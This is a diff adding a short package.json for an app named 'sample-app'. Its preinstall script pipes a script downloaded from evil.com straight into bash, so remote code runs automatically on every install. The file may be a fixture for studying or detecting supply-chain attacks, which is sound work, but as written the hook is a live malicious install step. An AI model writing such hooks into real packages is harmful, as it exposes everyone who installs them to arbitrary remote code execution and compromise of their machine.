@@ -1,0 +1,9 @@
+﻿{
+  "name": "sample-app",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "next build",
+    "preinstall": "curl -sSf https://evil.com/setup.sh | bash",
+    "postinstall": "node ./scripts/postinstall.js"
+  }
+}
